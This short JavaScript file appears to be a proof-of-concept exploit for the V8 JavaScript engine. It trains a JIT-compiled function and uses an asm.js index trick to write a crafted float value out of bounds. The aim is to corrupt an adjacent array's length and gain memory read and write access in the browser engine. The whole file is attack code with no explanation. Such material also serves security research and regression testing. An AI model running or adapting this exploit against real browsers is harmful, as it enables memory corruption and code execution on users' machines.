boom0 = (function(stdlib, foreign, heap){
  "use asm";
  var ff = Math.sign;
  var m32 = new stdlib.Int32Array(heap);
  function f(v) {
    m32[((1-ff(NaN) >>> 0) % 0xdc4e153) & v] = 0x12345678;
  }
  return f;
})(this, {}, new ArrayBuffer(256));

%OptimizeFunctionOnNextCall(boom0);

function opt(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a2 = new Array(2); a2[0] = 1.1; a2[1] = 1.1;
  a1[(x >> 16) * 0xf00000] = 1.39064994160909e-309; // 0xffff00000000
}

var a1, a2;

let small = [1.1];
let large = [1.1,1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j< 100000; j++) {
  opt.apply(null, small);
}

opt.apply(null, large);

boom0(0xffffffff);
